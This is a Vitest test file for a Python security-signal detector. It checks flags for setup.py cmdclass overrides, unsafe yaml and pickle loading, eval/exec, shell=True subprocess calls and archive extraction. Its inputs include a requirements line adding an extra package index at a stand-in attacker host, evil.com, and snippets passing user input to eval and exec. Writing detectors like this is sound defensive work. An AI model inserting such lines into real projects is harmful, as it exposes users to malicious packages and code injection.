import { describe, it, expect } from 'vitest';
import { PythonSignals } from '../../../src/security/signals/python-signals.js';

const detector = new PythonSignals();
const SRC = '/project/src/app.py';

describe('PythonSignals', () => {
  it('language property is "python"', () => {
    expect(detector.language).toBe('python');
  });

  // Existing manifest detection still works
  it('detects cmdclass-override in setup.py', () => {
    const signals = detector.detect('/project/setup.py', 'setup(cmdclass={"build": MyBuild})');
    expect(signals.some(s => s.type === 'cmdclass-override')).toBe(true);
  });

  it('detects extra-index-url in requirements.txt', () => {
    const signals = detector.detect('/project/requirements.txt', '--extra-index-url https://evil.com\nrequests==2.28.0');
    expect(signals.some(s => s.type === 'extra-index-url')).toBe(true);
  });

  // Source pattern: unsafe-deserialization
  describe('unsafe-deserialization', () => {
    it('detects yaml.load() without SafeLoader', () => {
      const signals = detector.detect(SRC, 'data = yaml.load(stream)');
      expect(signals.some(s => s.type === 'yaml-unsafe-load')).toBe(true);
      expect(signals.find(s => s.type === 'yaml-unsafe-load')!.severity).toBe('critical');
      expect(signals.find(s => s.type === 'yaml-unsafe-load')!.category).toBe('unsafe-deserialization');
    });

    it('does not flag yaml.load() when SafeLoader is specified', () => {
      const signals = detector.detect(SRC, 'data = yaml.load(stream, Loader=SafeLoader)');
      expect(signals.some(s => s.type === 'yaml-unsafe-load')).toBe(false);
    });

    it('detects pickle.load()', () => {
      const signals = detector.detect(SRC, 'obj = pickle.load(f)');
      expect(signals.some(s => s.type === 'pickle-load')).toBe(true);
      expect(signals.find(s => s.type === 'pickle-load')!.severity).toBe('critical');
      expect(signals.find(s => s.type === 'pickle-load')!.category).toBe('unsafe-deserialization');
    });

    it('detects pickle.loads()', () => {
      const signals = detector.detect(SRC, 'obj = pickle.loads(data)');
      expect(signals.some(s => s.type === 'pickle-load')).toBe(true);
    });
  });

  // Source pattern: code-injection
  describe('code-injection', () => {
    it('detects eval() call', () => {
      const signals = detector.detect(SRC, 'result = eval(user_input)');
      expect(signals.some(s => s.type === 'eval-call')).toBe(true);
      expect(signals.find(s => s.type === 'eval-call')!.severity).toBe('critical');
      expect(signals.find(s => s.type === 'eval-call')!.category).toBe('code-injection');
    });

    it('detects exec() call', () => {
      const signals = detector.detect(SRC, 'exec(user_code)');
      expect(signals.some(s => s.type === 'exec-call')).toBe(true);
      expect(signals.find(s => s.type === 'exec-call')!.severity).toBe('critical');
      expect(signals.find(s => s.type === 'exec-call')!.category).toBe('code-injection');
    });

    it('detects subprocess.call with shell=True', () => {
      const signals = detector.detect(SRC, 'subprocess.call(cmd, shell=True)');
      expect(signals.some(s => s.type === 'subprocess-shell')).toBe(true);
      expect(signals.find(s => s.type === 'subprocess-shell')!.severity).toBe('critical');
      expect(signals.find(s => s.type === 'subprocess-shell')!.category).toBe('code-injection');
    });

    it('does not flag subprocess.call without shell=True', () => {
      const signals = detector.detect(SRC, 'subprocess.call(["ls", "-l"])');
      expect(signals.some(s => s.type === 'subprocess-shell')).toBe(false);
    });
  });

  // Source pattern: unsafe-archive-extraction
  describe('unsafe-archive-extraction', () => {
    it('detects zipfile.extractall()', () => {
      const signals = detector.detect(SRC, 'zipfile.extractall("/tmp/output")');
      expect(signals.some(s => s.type === 'archive-extractall')).toBe(true);
      expect(signals.find(s => s.type === 'archive-extractall')!.severity).toBe('high');
      expect(signals.find(s => s.type === 'archive-extractall')!.category).toBe('unsafe-archive-extraction');
    });

    it('detects tarfile.extractall()', () => {
      const signals = detector.detect(SRC, 'tarfile.extractall("/tmp/output")');
      expect(signals.some(s => s.type === 'archive-extractall')).toBe(true);
    });
  });

  it('returns no source signals for clean Python code', () => {
    const clean = `
import os
import json

def load_config(path):
    with open(path) as f:
        return json.load(f)
`;
    const signals = detector.detect(SRC, clean);
    expect(signals).toHaveLength(0);
  });

  it('scans source patterns even for non-manifest .py files', () => {
    const signals = detector.detect('/project/utils/helper.py', 'eval(x)');
    expect(signals.some(s => s.type === 'eval-call')).toBe(true);
  });
});
